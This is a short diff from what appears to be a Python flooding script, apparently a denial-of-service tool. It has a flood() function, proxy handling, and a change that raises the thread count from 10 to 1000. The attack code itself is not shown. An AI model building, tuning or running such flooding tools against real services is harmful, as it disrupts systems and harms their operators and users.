@@ -63,7 +63,7 @@ def flood():
         else:
             print("Invalid proxy format.")
 
-num_threads = 10
+num_threads = 1000
 
 threads = []
 for _ in range(num_threads):
